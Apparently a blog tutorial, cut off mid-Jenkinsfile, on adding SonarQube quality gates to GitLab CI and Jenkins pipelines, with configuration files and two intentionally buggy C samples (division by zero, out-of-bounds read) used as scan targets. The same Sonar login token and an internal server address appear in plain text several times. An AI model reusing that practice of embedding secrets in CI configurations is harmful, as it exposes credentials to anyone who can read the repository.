<p>The Jenkis CI is a third-party CI system and Gitlab CI is originated from Gitlab on the contrary. The deployment experience on both platforms can be applied to other situations.</p>
<h2 id="Trigger-A-Gitlab-Pipeline-Separatly"><a href="#Trigger-A-Gitlab-Pipeline-Separatly" class="headerlink" title="Trigger A Gitlab Pipeline Separatly"></a>Trigger A Gitlab Pipeline Separatly</h2><p>There are three steps to accomplish this: </p>
<ul>
<li>Set up Gitlab runner</li>
<li>Register a runner for your project</li>
<li>Create the <em>.gitlab-ci.yml</em> file in your project</li>
</ul>
<p>Go to Settings &gt; CI/CD and expand Runners to see if you have available runners. You could notice that there’s a token listed on the board, it will be used for the gitlab-runner configuration later. If no runners are listed on the page you must install Gitlab runner:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gitlab-runner</span><br></pre></td></tr></table></figure>
<p>After that, you need to register a runner to perform your task:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gitlab-runner register</span><br></pre></td></tr></table></figure>
<p>You need to enter some information the runner requires to finish the registration:</p>
<ul>
<li>Enter your GitLab instance URL.</li>
<li>Enter the token you obtained to register the runner.</li>
<li>Enter a description for the runner. You can change this value later in the GitLab user interface.</li>
<li>Enter the tags associated with the runner, separated by commas. You can change this value later in the GitLab user interface. Please note that if you don’t want your runner’s tags associated with the ones you defined in Gitlab, you can modify the configuration in the runner’s setting panel.</li>
</ul>
<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_1.png" width="100%" height="100%">

<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_2.png" width="100%" height="100%">

<ul>
<li>Provide the runner executor. For most use cases, enter docker.</li>
<li>If you entered docker as your executor, you’ll be asked for the default image to be used for projects that do not define one in .gitlab-ci.yml. If you don’t want the docker as the executor to pull images every time, you need to add the <em>pull_policy</em> parameter in the configuration file: <em>/etc/gitlab-runner/config.toml</em><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="attr">concurrent</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">check_interval</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="section">[session_server]</span></span><br><span class="line">  <span class="attr">session_timeout</span> = <span class="number">1800</span></span><br><span class="line"></span><br><span class="line"><span class="section">[[runners]]</span></span><br><span class="line">  <span class="attr">name</span> = <span class="string">&quot;CI test project&quot;</span></span><br><span class="line">  <span class="attr">url</span> = <span class="string">&quot;http://172.20.1.135&quot;</span></span><br><span class="line">  <span class="attr">token</span> = <span class="string">&quot;Your project token&quot;</span></span><br><span class="line">  <span class="attr">executor</span> = <span class="string">&quot;docker&quot;</span></span><br><span class="line">  <span class="section">[runners.custom_build_dir]</span></span><br><span class="line">  <span class="section">[runners.cache]</span></span><br><span class="line">    <span class="section">[runners.cache.s3]</span></span><br><span class="line">    <span class="section">[runners.cache.gcs]</span></span><br><span class="line">    <span class="section">[runners.cache.azure]</span></span><br><span class="line">  <span class="section">[runners.docker]</span></span><br><span class="line">    <span class="attr">tls_verify</span> = <span class="literal">false</span></span><br><span class="line">    <span class="attr">image</span> = <span class="string">&quot;ubuntu:latest&quot;</span></span><br><span class="line">    <span class="attr">privileged</span> = <span class="literal">false</span></span><br><span class="line">    <span class="attr">disable_entrypoint_overwrite</span> = <span class="literal">false</span></span><br><span class="line">    <span class="attr">oom_kill_disable</span> = <span class="literal">false</span></span><br><span class="line">    <span class="attr">disable_cache</span> = <span class="literal">false</span></span><br><span class="line">    <span class="attr">volumes</span> = [<span class="string">&quot;/cache&quot;</span>]</span><br><span class="line">    <span class="attr">shm_size</span> = <span class="number">0</span></span><br><span class="line">    <span class="attr">pull_policy</span> = <span class="string">&quot;if-not-present&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>The last step is to create the <em>.gitlab-ci.yml</em> file which is used to trigger your Gitlab pipeline. In this file, you define:</p>
<ul>
<li>The structure and order of jobs that the runner should execute.</li>
<li>The decisions the runner should make when specific conditions are encountered.</li>
</ul>
<p>Now that most of the configuration is set up. Let’s have a try to trigger the Gitlab CI job by pushing our code to the remote repository.</p>
<p>Create two simple c files which has these vulnerable code:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    x=<span class="number">121</span>/<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y=<span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    x=a[y];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Makefile</span></span><br><span class="line"><span class="section">all: test1 test2</span></span><br><span class="line"></span><br><span class="line"><span class="section">test1:</span></span><br><span class="line">        gcc -o vuln.o vuln.c</span><br><span class="line"></span><br><span class="line"><span class="section">test2:</span></span><br><span class="line">        gcc -o vuln2.o vuln2.c</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        rm vuln*.o</span><br></pre></td></tr></table></figure>

<p>Then add these content to the <em>.gitlab-ci.yml</em> file:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">build-job:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">build</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">apt</span> <span class="string">update</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">apt</span> <span class="string">install</span> <span class="string">gcc</span> <span class="string">make</span> <span class="string">-y</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">&quot;Starting up the building process!&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">make</span></span><br></pre></td></tr></table></figure>
<p>You can definitely build your own images without installing packages every time, which will save a lot of building time. Now you can commit and push your project to the remote repository to trigger the CI pipeline job. You can get the build status after a while.</p>
<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_3.png" width="100%" height="100%">

<p>And you can also check the build details if you will:</p>
<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_4.png" width="100%" height="100%">

<h2 id="Trigger-A-Jenkins-Pipeline-Separatly"><a href="#Trigger-A-Jenkins-Pipeline-Separatly" class="headerlink" title="Trigger A Jenkins Pipeline Separatly"></a>Trigger A Jenkins Pipeline Separatly</h2><p>The Jenkins pipeline task is mentioned in another post: <a href="https://recursively.review/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/">https://recursively.review/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/</a></p>
<h2 id="Trigger-A-Sonar-Scanning-Task-Separatly"><a href="#Trigger-A-Sonar-Scanning-Task-Separatly" class="headerlink" title="Trigger A Sonar Scanning Task Separatly"></a>Trigger A Sonar Scanning Task Separatly</h2><p>Now it’s time to use Sonarqube to perform the code quality scanning. To accomplish that, we need to set up both Sonarqube and Sonar-scanner environment. First and foremost, create the Sonarqube server environment, it’s easily to do that with a docker image:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --name sonarqube -e SONAR_ES_BOOTSTRAP_CHECKS_DISABLE=true -p 9000:9000 sonarqube:latest</span><br></pre></td></tr></table></figure>
<p>When it’s finished, you can access the Sonarqube web UI server through the browser. Let’s create a scanning project and fill in these blank area. </p>
<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_5.png" width="100%" height="100%">

<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_6.png" width="100%" height="100%">

<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_7.png" width="100%" height="100%">

<p>Since the community version of Sonarqube doesn’t support the scanning for C/C++ code, we have to install plugins to enable the C/C++ checking rule. Sonar-cxx(<a href="https://github.com/SonarOpenCommunity/sonar-cxx">https://github.com/SonarOpenCommunity/sonar-cxx</a>) is a nice tool which has many sensors for reading reports generated by other scanning tools such as cppcheck and infer.</p>
<p>Here we use cppcheck to find the flaws in our code:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install cppcheck</span><br><span class="line"></span><br><span class="line">cppcheck --xml --xml-version=2 --enable=all ./ 2&gt; cppcheck-report.xml</span><br></pre></td></tr></table></figure>

<p>Create a configuration file in your project’s root directory called <em>sonar-project.properties</em>, and add some configuration for cxx plugin:</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># must be unique in a given SonarQube instance</span></span><br><span class="line"><span class="attr">sonar.projectKey</span>=test</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- optional properties ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># defaults to project key</span></span><br><span class="line"><span class="comment">#sonar.projectName=My project</span></span><br><span class="line"><span class="comment"># defaults to &#x27;not provided&#x27;</span></span><br><span class="line"><span class="comment">#sonar.projectVersion=1.0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Path is relative to the sonar-project.properties file. Defaults to .</span></span><br><span class="line"><span class="comment">#sonar.sources=.</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Encoding of the source code. Default is default system encoding</span></span><br><span class="line"><span class="comment">#sonar.sourceEncoding=UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mandatory: files to be handled by the _cxx plugin_</span></span><br><span class="line"><span class="attr">sonar.cxx.file.suffixes</span>=.h,.cpp,.c</span><br><span class="line"></span><br><span class="line"><span class="attr">sonar.cxx.cppcheck.reportPaths</span>=cppcheck-report.xml</span><br></pre></td></tr></table></figure>

<p>Now we can start a Sonar-scanner job to perform our code scanning.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker run \</span><br><span class="line">    --rm \</span><br><span class="line">    -e SONAR_HOST_URL=&quot;http://172.20.1.135:9000&quot; \</span><br><span class="line">    -e SONAR_LOGIN=&quot;50b94782744687df5d5b04863b6a3c2198b3361a&quot; \</span><br><span class="line">    -v &quot;/home/CI/awesome/:/usr/src&quot; \</span><br><span class="line">    sonarsource/sonar-scanner-cli</span><br></pre></td></tr></table></figure>
<p>If everything goes well, you can find that all the findings are listed on the Sonarqube project board.</p>
<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_8.png" width="100%" height="100%">

<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_9.png" width="100%" height="100%">

<h2 id="Build-Job-amp-Sonar-Scanner-Combination"><a href="#Build-Job-amp-Sonar-Scanner-Combination" class="headerlink" title="Build Job &amp; Sonar Scanner Combination"></a>Build Job &amp; Sonar Scanner Combination</h2><p>To perform both cppcheck and Sonarqube scanning, you need to modify your container to include both of the tools.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker run -it --rm IMAGE_ID /bin/bash</span><br></pre></td></tr></table></figure>

<p>Install the cppcheck package in the container:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash-5.1# apk add cppcheck</span><br></pre></td></tr></table></figure>

<p>Commit your modified container from another terminal in order to perform the CI scanning task later:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker commit CONTAINER_ID modified/sonar-scanner-cli</span><br></pre></td></tr></table></figure>

<p>Create the <em>.gitlab-ci.yml</em> and edit the configuration:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">build-job:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">build</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">apt</span> <span class="string">update</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">apt</span> <span class="string">install</span> <span class="string">gcc</span> <span class="string">make</span> <span class="string">-y</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">&quot;Starting up the building process!&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">make</span></span><br><span class="line"></span><br><span class="line"><span class="attr">sonarqube-check:</span></span><br><span class="line">  <span class="attr">image:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">modified/sonar-scanner-cli:latest</span></span><br><span class="line">    <span class="attr">entrypoint:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">variables:</span></span><br><span class="line">    <span class="attr">SONAR_USER_HOME:</span> <span class="string">&quot;/home/CI/awesome/.sonar&quot;</span>  <span class="comment"># Defines the location of the analysis task cache</span></span><br><span class="line">    <span class="attr">GIT_DEPTH:</span> <span class="string">&quot;0&quot;</span>  <span class="comment"># Tells git to fetch all the branches of the project, required by the analysis task</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">key:</span> <span class="string">&quot;sonar ci&quot;</span></span><br><span class="line">    <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">.sonar/cache</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">cppcheck</span> <span class="string">--xml</span> <span class="string">--xml-version=2</span> <span class="string">--enable=all</span> <span class="string">./</span> <span class="number">2</span><span class="string">&gt;</span> <span class="string">cppcheck-report.xml</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">sonar-scanner</span></span><br><span class="line">      <span class="string">-Dsonar.qualitygate.wait=true</span></span><br><span class="line">      <span class="string">-Dsonar.host.url=&quot;http://172.20.1.135:9000&quot;</span></span><br><span class="line">      <span class="string">-Dsonar.login=&quot;50b94782744687df5d5b04863b6a3c2198b3361a&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">allow_failure:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">merge_requests</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">develop</span></span><br></pre></td></tr></table></figure>
<p>Trigger the Gitlab CI pipeline and take a look at the status:</p>
<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_10.png" width="100%" height="100%">

<p>Furthermore, Sonarqube allows you to configure the quality gate conditions to decide what sort of code quality can pass the CI pipeline. </p>
<p>In this scenario, we’re gonna create the quality gate before the merge process, the merge request won’t succeed if the the status of the quality gate is failed. First of all, we need to choose the checkbox below to enable the merge check.</p>
<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_15.png" width="100%" height="100%">

<p>Create a new quelity gate and add a reliability rating condition which decides whether passing the merge or not.</p>
<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_11.png" width="100%" height="100%">

<p>Now create a new branch and try merging this new branch into master branch, the code owner will get a notification like this:</p>
<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_12.png" width="100%" height="100%">

<p>If the code scanning failed, the merge button will be in red. And you can find that the pipeline failed because it did not pass the quality gate.</p>
<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_13.png" width="60%" height="60%">

<img src="/2021/07/28/Sonar-Code-Quality-Gate-Integration-with-CI-Part-1/pic_14.png" width="100%" height="100%">

<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://docs.gitlab.com/runner/register/">https://docs.gitlab.com/runner/register/</a></p>
<p><a href="https://docs.gitlab.com/runner/executors/docker.html">https://docs.gitlab.com/runner/executors/docker.html</a></p>
<p><a href="https://docs.sonarqube.org/latest/setup/get-started-2-minutes/">https://docs.sonarqube.org/latest/setup/get-started-2-minutes/</a></p>
<p><a href="https://docs.sonarqube.org/latest/analysis/scan/sonarscanner/">https://docs.sonarqube.org/latest/analysis/scan/sonarscanner/</a></p>
<p><a href="https://docs.sonarqube.org/latest/analysis/gitlab-integration/">https://docs.sonarqube.org/latest/analysis/gitlab-integration/</a></p>
]]></content>
      <categories>
        <category>SAST</category>
      </categories>
      <tags>
        <tag>sonarqube</tag>
        <tag>sonar-scanner</tag>
        <tag>Jenkins</tag>
        <tag>Gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title>Sonar Code Quality Gate Integration with CI - Part 2</title>
    <url>/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/</url>
    <content><![CDATA[<h2 id="Configuration-for-Jenkins-and-Gitlab"><a href="#Configuration-for-Jenkins-and-Gitlab" class="headerlink" title="Configuration for Jenkins and Gitlab"></a>Configuration for Jenkins and Gitlab</h2><p>First and foremost, you have to configure the Jenkins CI and Gitlab to make sure they have permission to access each other. You can find the detailed guide to set them up properly from this website: <a href="https://docs.gitlab.com/ee/integration/jenkins.html#grant-jenkins-access-to-gitlab-project">https://docs.gitlab.com/ee/integration/jenkins.html#grant-jenkins-access-to-gitlab-project</a>.</p>
<p>I used the webhook to notify Jenkins from Gitlab once any events are triggered. On the Jenkins, modify the project’s configuration and generate a random secret token.</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_1.png" width="100%" height="100%">

<p>Fill in the blank URL area with your Jenkins server address in the Gtilab webhook configuration and paste the secret token to the next line.</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_2.png" width="100%" height="100%">

<p>After you finish the configuration you can take a test to verify the functionality. If everything goes well, you can get the status code 200 from Gitlab.</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_3.png" width="100%" height="100%">

<p>You can even go through the request and response packet to see what happened if you will.</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_4.png" width="100%" height="100%">

<p>The Jenkins job we just created is a pipeline job, which allows us to define our build tasks through the groovy script. There are some additional work you should do to allow Jenkins to trigger the build job from the <em>Jenkinsfile</em> from your repository.</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_5.png" width="100%" height="100%">

<h2 id="Tigger-the-Jenkins-Pipeline"><a href="#Tigger-the-Jenkins-Pipeline" class="headerlink" title="Tigger the Jenkins Pipeline"></a>Tigger the Jenkins Pipeline</h2><p>Create the <em>Jenkinsfile</em> file under the root directory of your repository, and add the build script:</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">    agent any</span><br><span class="line"></span><br><span class="line">    stages &#123;</span><br><span class="line">        stage(<span class="string">&#x27;gitlab&#x27;</span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                echo <span class="string">&#x27;Notify GitLab&#x27;</span></span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;build&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;pending&#x27;</span></span><br><span class="line">                sh <span class="string">&quot;make&quot;</span></span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;build&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The repository we’re gonna use is the same as we created previously in this post: <a href="https://recursively.review/2021/07/28/Sonar-Code-Qualitygate-Integration-with-CI-Part-1/">https://recursively.review/2021/07/28/Sonar-Code-Qualitygate-Integration-with-CI-Part-1/</a>.</p>
<p>Commit your changes and push them to the remote repository to trigger the Jenkins pipeline. After a while, you can switch to Jenkins dashboard to check the build result.</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_6.png" width="100%" height="100%">

<h2 id="Integrate-the-Code-Scanning"><a href="#Integrate-the-Code-Scanning" class="headerlink" title="Integrate the Code Scanning"></a>Integrate the Code Scanning</h2><p>Let’s first try using the cppcheck to perform the code scanning. This time we’re gonna use the cppcheck plugin in Jenkins directly for convenience. Just install the cppcheck plugin and we’re good to go.</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">    agent any</span><br><span class="line"></span><br><span class="line">    stages &#123;</span><br><span class="line">        stage(<span class="string">&#x27;gitlab&#x27;</span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                echo <span class="string">&#x27;Notify GitLab&#x27;</span></span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;build&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;pending&#x27;</span></span><br><span class="line">                sh <span class="string">&quot;make&quot;</span></span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;build&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        stage(<span class="string">&#x27;scan&#x27;</span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                echo <span class="string">&#x27;Scan beginning&#x27;</span></span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;scan&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;running&#x27;</span></span><br><span class="line">                sh <span class="string">&quot;cppcheck --xml --xml-version=2 --enable=all ./ 2&gt; cppcheck-report.xml&quot;</span></span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;scan&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Take a look at the Jenkins building dashboard to check the status.</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_7.png" width="60%" height="60%">

<p>Now that we have scanned our project successfully with cppcheck, it will not be difficult to integrate the Sonarqube in order to establish our quality gate. Before that, we need to install the Sonar-scanner plugin in Jenkins. When the installation is finished, go to <strong>Manage Jenkins &gt; Configure System</strong> and scroll down to the <strong>SonarQube servers</strong> section. Click the <strong>Add SonarQube</strong> button to add the new configuration.</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_8.png" width="100%" height="100%">

<p>To use the Sonar-scanner command in the pipeline script, we have to firstly add a new Sonar-scanner tool in Jenkins.</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_9.png" width="100%" height="100%">

<h2 id="Quality-Gate-Integration"><a href="#Quality-Gate-Integration" class="headerlink" title="Quality Gate Integration"></a>Quality Gate Integration</h2><p>It’s pretty easy to add the quality gate to our CI, let’s make some changes to the sonar configuration file <em>sonar-project.properties</em>:</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># must be unique in a given SonarQube instance</span></span><br><span class="line"><span class="attr">sonar.projectKey</span>=test</span><br><span class="line"><span class="attr">sonar.login</span>=<span class="number">50</span>b94782744687df5d5b04863b6a3c2198b3361a</span><br><span class="line"><span class="attr">sonar.host.url</span>=http://<span class="number">172.20</span>.<span class="number">1.135</span>:<span class="number">9000</span></span><br><span class="line"><span class="attr">sonar.qualitygate.wait</span>=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- optional properties ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># defaults to project key</span></span><br><span class="line"><span class="comment">#sonar.projectName=My project</span></span><br><span class="line"><span class="comment"># defaults to &#x27;not provided&#x27;</span></span><br><span class="line"><span class="comment">#sonar.projectVersion=1.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Path is relative to the sonar-project.properties file. Defaults to .</span></span><br><span class="line"><span class="attr">sonar.sources</span>=.</span><br><span class="line"></span><br><span class="line"><span class="comment">#sonar.verbose=true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Encoding of the source code. Default is default system encoding</span></span><br><span class="line"><span class="comment">#sonar.sourceEncoding=UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mandatory: files to be handled by the _cxx plugin_</span></span><br><span class="line"><span class="attr">sonar.cxx.file.suffixes</span>=.h,.cpp,.c</span><br><span class="line"><span class="comment">#sonar.cxx.errorRecoveryEnabled=True</span></span><br><span class="line"><span class="comment">#sonar.cxx.includeDirectories=./</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sonar.scm.exclusions.disabled=true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">sonar.cxx.cppcheck.reportPaths</span>=cppcheck-report.xml</span><br></pre></td></tr></table></figure>
<p>For the <em>Jenkinsfile</em>:</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">    agent any</span><br><span class="line"></span><br><span class="line">    stages &#123;</span><br><span class="line">        stage(<span class="string">&#x27;gitlab&#x27;</span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                echo <span class="string">&#x27;Notify GitLab&#x27;</span></span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;build&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;pending&#x27;</span></span><br><span class="line">                sh <span class="string">&quot;make&quot;</span></span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;build&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        stage(<span class="string">&#x27;scan&#x27;</span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                echo <span class="string">&#x27;Scan beginning&#x27;</span></span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;scan&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;running&#x27;</span></span><br><span class="line">                sh <span class="string">&quot;cppcheck --xml --xml-version=2 --enable=all ./ 2&gt; cppcheck-report.xml&quot;</span></span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;scan&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        stage(<span class="string">&#x27;SonarQube analysis &amp; quality gate&#x27;</span>) &#123;</span><br><span class="line">            environment &#123;</span><br><span class="line">                scannerHome = tool <span class="string">&#x27;SonarScanner&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            steps &#123;</span><br><span class="line">                withSonarQubeEnv(<span class="string">&#x27;SonarQube&#x27;</span>) &#123;</span><br><span class="line">                    sh <span class="string">&quot;$&#123;scannerHome&#125;/bin/sonar-scanner&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now that we have finished setting up the configuration regardingly. If we push our changes to the remote repository the CI quality gate check process will take effect.</p>
<img src="/2021/08/04/Sonar-Code-Quality-Gate-Integration-with-CI-Part-2/pic_10.png" width="60%" height="60%">

<h2 id="Merge-Request-Combination"><a href="#Merge-Request-Combination" class="headerlink" title="Merge Request Combination"></a>Merge Request Combination</h2><p>Firstly make some changes to the Jenkins pipeline script in order to modify the merge request status during the pipeline progress.</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">    agent any</span><br><span class="line"></span><br><span class="line">    stages &#123;</span><br><span class="line">        stage(<span class="string">&#x27;gitlab&#x27;</span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                echo <span class="string">&#x27;Notify GitLab&#x27;</span></span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;build&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;running&#x27;</span></span><br><span class="line">                sh <span class="string">&quot;make&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        stage(<span class="string">&#x27;scan&#x27;</span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                echo <span class="string">&#x27;Scan beginning&#x27;</span></span><br><span class="line">                sh <span class="string">&quot;cppcheck --xml --xml-version=2 --enable=all ./ 2&gt; cppcheck-report.xml&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        stage(<span class="string">&#x27;SonarQube analysis &amp; quality gate&#x27;</span>) &#123;</span><br><span class="line">            environment &#123;</span><br><span class="line">                scannerHome = tool <span class="string">&#x27;SonarScanner&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            steps &#123;</span><br><span class="line">                withSonarQubeEnv(<span class="string">&#x27;SonarQube&#x27;</span>) &#123;</span><br><span class="line">                    sh <span class="string">&quot;$&#123;scannerHome&#125;/bin/sonar-scanner&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">                updateGitlabCommitStatus <span class="attr">name:</span> <span class="string">&#x27;build&#x27;</span>, <span class="attr">state:</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    